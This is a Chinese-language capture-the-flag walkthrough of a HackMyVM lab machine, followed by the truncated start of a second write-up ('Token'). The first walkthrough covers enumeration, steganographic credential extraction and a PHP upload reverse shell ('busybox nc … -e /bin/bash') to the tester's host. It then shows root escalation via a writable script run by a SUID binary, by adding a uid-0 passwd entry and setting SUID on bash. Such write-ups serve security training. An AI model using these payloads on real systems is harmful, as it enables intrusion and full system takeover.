bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.66 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak,md,db,js<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.66<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              md,db,js,php,txt,html,bak<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.html                (Status: 403) [Size: 277]<br>/.php                 (Status: 403) [Size: 277]<br>/blog                 (Status: 301) [Size: 311] [--&gt; http://192.168.2.66/blog/]<br>/index.html           (Status: 200) [Size: 582]<br>/uploads              (Status: 301) [Size: 314] [--&gt; http://192.168.2.66/uploads/]<br>/robots.txt           (Status: 200) [Size: 55]<br>/.html                (Status: 403) [Size: 277]<br>/.php                 (Status: 403) [Size: 277]<br>/server-status        (Status: 403) [Size: 277]<br>Progress: 1764480 / 1764488 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>存在目录<code>/blog、/uploads、/robots.txt</code></p><h1 id="二、漏洞测试"><a href="#二、漏洞测试" class="headerlink" title="二、漏洞测试"></a>二、漏洞测试</h1><h2 id="1、FTP服务渗透"><a href="#1、FTP服务渗透" class="headerlink" title="1、FTP服务渗透"></a>1、FTP服务渗透</h2><p>根据搜集到的信息，使用<code>anonymous</code>登录FTP服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# ftp 192.168.2.66<br>Connected to 192.168.2.66.<br>220 (vsFTPd 3.0.5)<br>Name (192.168.2.66:root): anonymous<br>331 Please specify the password.<br>Password: <br>230 Login successful.<br>Remote system <span class="hljs-built_in">type</span> is UNIX.<br>Using binary mode to transfer files.<br>ftp&gt; <span class="hljs-built_in">ls</span><br>229 Entering Extended Passive Mode (|||9335|)<br>150 Here comes the directory listing.<br>drwxr-xr-x    2 114      119          4096 Jul 16 12:35 pub<br>226 Directory send OK.<br>ftp&gt; <span class="hljs-built_in">cd</span> pub<br>250 Directory successfully changed.<br>ftp&gt; <span class="hljs-built_in">ls</span><br>229 Entering Extended Passive Mode (|||9201|)<br>150 Here comes the directory listing.<br>-rw-r--r--    1 0        0         1366786 Jul 16 12:35 note.jpg<br>226 Directory send OK.<br></code></pre></td></tr></table></figure><p>成功登录并发现<code>/pub</code>目录下面有一个名为<code>note.jpg</code>的文件，将其下载至本地</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ftp&gt; get note.jpg<br>local: note.jpg remote: note.jpg<br>229 Entering Extended Passive Mode (|||10901|)<br>150 Opening BINARY mode data connection for note.jpg (1366786 bytes).<br>100% |<span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">**|  1334 KiB   79.73 MiB/s    00:00 ETA</span><br><span class="hljs-strong">226 Transfer complete.</span><br><span class="hljs-strong">1366786 bytes received in 00:00 (76.77 MiB/s)</span><br><span class="hljs-strong">ftp&gt; exit</span><br><span class="hljs-strong">221 Goodbye.</span><br></code></pre></td></tr></table></figure><h3 id="图片隐写获取凭证"><a href="#图片隐写获取凭证" class="headerlink" title="图片隐写获取凭证"></a>图片隐写获取凭证</h3><p>直接使用<code>steghide</code>工具提取<code>note.jpg</code>文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp] <br>└─# steghide extract -sf note.jpg <br>Enter passphrase: <br>wrote extracted data to <span class="hljs-string">&quot;creds.txt&quot;</span>.<br></code></pre></td></tr></table></figure><p>成功从图片中提取出隐藏的凭证，尝试ssh登录，发现登录失败，说明该凭证不是用于ssh登录</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">┌──(root㉿kali)-[/tmp] <br>└─<span class="hljs-meta"># cat creds.txt </span><br><span class="hljs-symbol">Username:</span> dev <br><span class="hljs-symbol">Password:</span> d3v3l0pm3nt!nt3rn<br></code></pre></td></tr></table></figure><h2 id="2、WEB-80端口渗透"><a href="#2、WEB-80端口渗透" class="headerlink" title="2、WEB-80端口渗透"></a>2、WEB-80端口渗透</h2><p>访问80端口页面，在<code>/blog</code>目录下面查看页面源码找到相关的一些提示信息</p><ol><li><strong>DevLog #1</strong>：Arvind:他再次使用note.jpg。让我们看看这次能持续多久。</li><li><strong>DevLog #2</strong>：隐藏提示:有时最简单的转移方法——保存每个字节的方法——最好保护隐藏的秘密。</li><li><strong>DevLog #3</strong>：脚本位于<code>/usr/local/bin/</code>下方的某个地方；Arvind:重置脚本从未打算被任何人编写……但我们在这里。</li><li>Arvind:兄弟,你忘了禁用那个旧登录</li></ol><p>访问<code>robots.txt</code>文件泄露的两个路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# curl http://192.168.2.66/robots.txt<br>Disallow: /cms-admin.php<br>Disallow: /auth-LazyCorp-dev/<br></code></pre></td></tr></table></figure><p>访问发现两个路径均访问<code>404 Not Found</code><br>    由于Linux系统上的Web服务器路径通常是大小写敏感的，尝试访问全是小写的<code>/auth_lazycorp_dev</code>，发现访问<code>403 Forbidden</code>，这说明该目录存在，但是没有权限直接访问或者列出其内容</p><p>再次对目录<code>/auth_lazycorp_dev</code>进行深度扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# dirsearch -u <span class="hljs-string">&quot;http://192.168.2.66//auth-lazycorp-dev/&quot;</span><br><br>Target: http://192.168.2.66/<br><br>[00:04:31] Starting: /auth-lazycorp-dev/<br>[00:05:03] 302 -    0B  - //auth-lazycorp-dev/dashboard.php  -&gt;  login.php<br>[00:05:20] 200 -  390B  - //auth-lazycorp-dev/login.php<br>[00:05:55] 301 -  332B  - //auth-lazycorp-dev/uploads  -&gt;  http://192.168.2.66/auth-lazycorp-dev/uploads/<br><br>Task Completed<br></code></pre></td></tr></table></figure><p>存在目录：<code>/login.php、/uploads</code></p><p>访问<code>/auth-lazycorp-dev/login.php</code>，成功找到登录页面<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202508200023854.png"></p><h4 id="文件上传Getshell"><a href="#文件上传Getshell" class="headerlink" title="文件上传Getshell"></a>文件上传Getshell</h4><p>使用找到的凭证<code>Username: dev，Password: d3v3l0pm3nt!nt3rn</code>进行登录，成功进入到文件上传页面</p><p>上传一个<code>php反向shell</code>来获取服务器权限</p><ol><li>准备一个php反向shell<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;busybox nc 192.168.2.4 4444 -e /bin/bash&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li><li>通过后台直接上传文件</li><li>在<code>kali</code>上使用<code>netcat</code>监听指定的端口<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nc -lvnp 4444                             <br>listening on [any] 4444 ...<br></code></pre></td></tr></table></figure></li><li>访问上传后的php文件<code>http://192.168.2.66/auth-lazycorp-dev/uploads/rev.php</code>，触发反弹<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@arvindlazycorp:/$ <span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br></code></pre></td></tr></table></figure>成功获取<code>www-data</code>权限</li></ol><h1 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h1><h2 id="1、获取arvind权限"><a href="#1、获取arvind权限" class="headerlink" title="1、获取arvind权限"></a>1、获取arvind权限</h2><p>在<code>/home/arvind</code>目录下面发现<code>.ssh</code>目录，其中包含着ssh私钥<code>id_rsa</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@arvindlazycorp:/home/arvind/.ssh$ <span class="hljs-built_in">ls</span> -la<br>total 20<br>drwxr-xr-x 2 arvind arvind 4096 Jul  9 07:37 .<br>drwxr-xr-x 5 arvind arvind 4096 Jul 16 12:49 ..<br>-rw------- 1 arvind arvind  747 Jul  9 07:47 authorized_keys<br>-rw-r--r-- 1 arvind arvind 3389 Jul  9 07:37 id_rsa<br>-rw-r--r-- 1 arvind arvind  747 Jul  9 07:37 id_rsa.pub<br></code></pre></td></tr></table></figure><p>直接使用私钥以<code>arvind</code>用户的身份进行登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@arvindlazycorp:/home/arvind/.ssh$ ssh -i id_rsa arvind@127.0.0.1<br>...<br>Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)<br><br>arvind@arvindlazycorp:~$ <span class="hljs-built_in">id</span><br>uid=1000(arvind) gid=1000(arvind) <span class="hljs-built_in">groups</span>=1000(arvind),4(adm),24(cdrom),27(<span class="hljs-built_in">sudo</span>),30(dip),46(plugdev),117(lxd)<br></code></pre></td></tr></table></figure><p>成功获取<code>arvind</code>用户权限</p><h2 id="2、获取root权限"><a href="#2、获取root权限" class="headerlink" title="2、获取root权限"></a>2、获取root权限</h2><p>查看具有<code>suid</code>权限的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@arvindlazycorp:/tmp$ find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>...<br>/home/arvind/reset<br></code></pre></td></tr></table></figure><p>发现在<code>/home/arvind/</code>目录下，具有一个<code>suid</code>权限的文件<code>reset</code><br>    SUID是一种特殊的文件权限，它允许用户在执行该文件时，临时获得文件所有者（在这里是root）的权限</p><p>使用<code>strings</code>分析该文件，查看其功能</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@arvindlazycorp:/tmp$ strings /home/arvind/reset<br>/lib64/ld-linux-x86-64.so.2<br>libc.so.6<br>setuid<br>system<br>__cxa_finalize<br>__libc_start_main<br>GLIBC_2.2.5<br>_ITM_deregisterTMCloneTable<br>__gmon_start__<br>_ITM_registerTMCloneTable<br>u+UH<br>[]A\A]A^A_<br>/usr/bin/reset_site.sh<br>:*3$<span class="hljs-string">&quot;</span><br><span class="hljs-string">GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0</span><br><span class="hljs-string">crtstuff.c</span><br><span class="hljs-string">deregister_tm_clones</span><br><span class="hljs-string">__do_global_dtors_aux</span><br><span class="hljs-string">completed.8061</span><br><span class="hljs-string">__do_global_dtors_aux_fini_array_entry</span><br><span class="hljs-string">frame_dummy</span><br><span class="hljs-string">__frame_dummy_init_array_entry</span><br><span class="hljs-string">reset.c</span><br><span class="hljs-string">__FRAME_END__</span><br><span class="hljs-string">__init_array_end</span><br><span class="hljs-string">_DYNAMIC</span><br><span class="hljs-string">__init_array_start</span><br><span class="hljs-string">__GNU_EH_FRAME_HDR</span><br><span class="hljs-string">_GLOBAL_OFFSET_TABLE_</span><br><span class="hljs-string">__libc_csu_fini</span><br><span class="hljs-string">_ITM_deregisterTMCloneTable</span><br><span class="hljs-string">_edata</span><br><span class="hljs-string">system@@GLIBC_2.2.5</span><br><span class="hljs-string">__libc_start_main@@GLIBC_2.2.5</span><br><span class="hljs-string">__data_start</span><br><span class="hljs-string">__gmon_start__</span><br><span class="hljs-string">__dso_handle</span><br><span class="hljs-string">_IO_stdin_used</span><br><span class="hljs-string">__libc_csu_init</span><br><span class="hljs-string">__bss_start</span><br><span class="hljs-string">main</span><br><span class="hljs-string">__TMC_END__</span><br><span class="hljs-string">_ITM_registerTMCloneTable</span><br><span class="hljs-string">setuid@@GLIBC_2.2.5</span><br><span class="hljs-string">__cxa_finalize@@GLIBC_2.2.5</span><br><span class="hljs-string">.symtab</span><br><span class="hljs-string">.strtab</span><br><span class="hljs-string">.shstrtab</span><br><span class="hljs-string">.interp</span><br><span class="hljs-string">.note.gnu.property</span><br><span class="hljs-string">.note.gnu.build-id</span><br><span class="hljs-string">.note.ABI-tag</span><br><span class="hljs-string">.gnu.hash</span><br><span class="hljs-string">.dynsym</span><br><span class="hljs-string">.dynstr</span><br><span class="hljs-string">.gnu.version</span><br><span class="hljs-string">.gnu.version_r</span><br><span class="hljs-string">.rela.dyn</span><br><span class="hljs-string">.rela.plt</span><br><span class="hljs-string">.init</span><br><span class="hljs-string">.plt.got</span><br><span class="hljs-string">.plt.sec</span><br><span class="hljs-string">.text</span><br><span class="hljs-string">.fini</span><br><span class="hljs-string">.rodata</span><br><span class="hljs-string">.eh_frame_hdr</span><br><span class="hljs-string">.eh_frame</span><br><span class="hljs-string">.init_array</span><br><span class="hljs-string">.fini_array</span><br><span class="hljs-string">.dynamic</span><br><span class="hljs-string">.data</span><br><span class="hljs-string">.bss</span><br><span class="hljs-string">.comment</span><br></code></pre></td></tr></table></figure><p>分析结果显示，该程序会调用 <code>/usr/bin/reset_site.sh</code> 脚本。检查该脚本的权限。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">arvind@arvindlazycorp:~$ <span class="hljs-built_in">ls</span> -la /usr/bin/reset_site.sh<br>-rwxrwxr-x 1 root arvind 254 Jul  9 10:26 /usr/bin/reset_site.sh<br></code></pre></td></tr></table></figure><p>发现当前用户 <code>arvind</code> 对这个脚本有写入权限。那我们可以通过修改该脚本内容，让 <code>reset</code> 程序在以root权限执行时，运行我们自定义的命令</p><h5 id="方法一：写入一个具有root权限的用户"><a href="#方法一：写入一个具有root权限的用户" class="headerlink" title="方法一：写入一个具有root权限的用户"></a>方法一：写入一个具有<code>root</code>权限的用户</h5><ol><li><p>使用<code>openssl</code>生成密码<code>123456</code>的哈希值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">admin@doctor:/$ openssl passwd<br>Password: <br>Verifying - Password: <br>cxHZ02OJlqOKA<br></code></pre></td></tr></table></figure></li><li><p>修改<code>/usr/bin/reset_site.sh</code>内容，写入一个具有<code>root</code>权限的用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-comment">#!/bin/bash</span><br>  <br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[*] Resetting website from backup...&quot;</span><br><br><span class="hljs-comment"># Remove current site</span><br><span class="hljs-built_in">rm</span> -rf /var/www/html/*<br><span class="hljs-comment"># Restore from backup</span><br><span class="hljs-built_in">cp</span> -r /opt/backup/* /var/www/html/<br><span class="hljs-comment"># Set correct ownership</span><br><span class="hljs-built_in">chown</span> -R www-data:www-data /var/www/html/<br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;miao:cxHZ02OJlqOKA:0:0:root:/root:/bin/bash&quot;</span> &gt;&gt; /etc/passwd<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Done resetting.&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>运行程序<code>reset</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">arvind@arvindlazycorp:~$ ./reset <br>[*] Resetting website from backup...<br>[+] Done resetting.<br></code></pre></td></tr></table></figure></li><li><p>切换用户到<code>miao</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">arvind@arvindlazycorp:~$ su miao<br>Password: <br>root@arvindlazycorp:/home/arvind# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><p>成功获取到<code>root</code>权限</p></li></ol><h5 id="方法二：将-bin-bash-添加SUID位"><a href="#方法二：将-bin-bash-添加SUID位" class="headerlink" title="方法二：将 /bin/bash 添加SUID位"></a>方法二：将 <code>/bin/bash</code> 添加SUID位</h5><ol><li><p>将提权命令写入脚本，这里我们将为 <code>/bin/bash</code> 添加SUID位。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">arvind@arvindlazycorp:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;chmod +s /bin/bash&#x27;</span> &gt; /usr/bin/reset_site.sh<br></code></pre></td></tr></table></figure></li><li><p>运行程序<code>reset</code></p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"> arvind@arvindlazycorp:~$ ./reset <br>[*] Resetting website from backup...<br>[+] Done resetting.<br></code></pre></td></tr></table></figure></li><li><p>检查 <code>/bin/bash</code> 的权限，发现已成功设置SUID位</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">arvind@arvindlazycorp:~$ <span class="hljs-built_in">ls</span> -la /bin/bash<br>-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash<br></code></pre></td></tr></table></figure></li><li><p>使用 <code>-p</code> 参数运行 <code>bash</code>，以保留SUID赋予的有效用户ID（euid），从而获得root权限的shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">arvind@arvindlazycorp:~$ bash -p<br>bash-5.0# <span class="hljs-built_in">id</span><br>uid=1000(arvind) gid=1000(arvind) euid=0(root) egid=0(root) <span class="hljs-built_in">groups</span>=0(root),4(adm),24(cdrom),27(<span class="hljs-built_in">sudo</span>),30(dip),46(plugdev),117(lxd),1000(arvind)<br></code></pre></td></tr></table></figure></li></ol><h1 id="四、获取FLAG"><a href="#四、获取FLAG" class="headerlink" title="四、获取FLAG"></a>四、获取FLAG</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@arvindlazycorp:~# <span class="hljs-built_in">cat</span> /home/arvind/user.txt /root/root.txt <br>FLAG&#123;you_got_foothold_nice&#125;<br>FLAG&#123;lazycorp_reset_exploit_worked&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hackmyvm</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传</tag>
      
      <tag>提权-suid</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Token</title>
    <link href="/Maze-sec/Token/"/>
    <url>/Maze-sec/Token/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p>QQ群：<code>660930334</code></p><h1 id="一、主机探测"><a href="#一、主机探测" class="headerlink" title="一、主机探测"></a>一、主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/token]<br>└─# nmap -sn 192.168.2.0/24              <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-25 09:01 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00043s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00034s latency).<br>MAC Address: 08:00:27:C7:7C:7C (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.63<br>Host is up (0.00094s latency).<br>MAC Address: 08:00:27:5C:90:A4 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.04 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.63</code></p><h1 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/token]<br>└─# nmap --min-rate 10000 -p- 192.168.2.63                           <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-25 09:01 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.63<br>Host is up (0.00034s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>5000/tcp open  upnp<br>MAC Address: 08:00:27:5C:90:A4 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 3.61 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22,80,5000</code></p><h2 id="2、详细信息扫描"><a href="#2、详细信息扫描" class="headerlink" title="2、详细信息扫描"></a>2、详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span 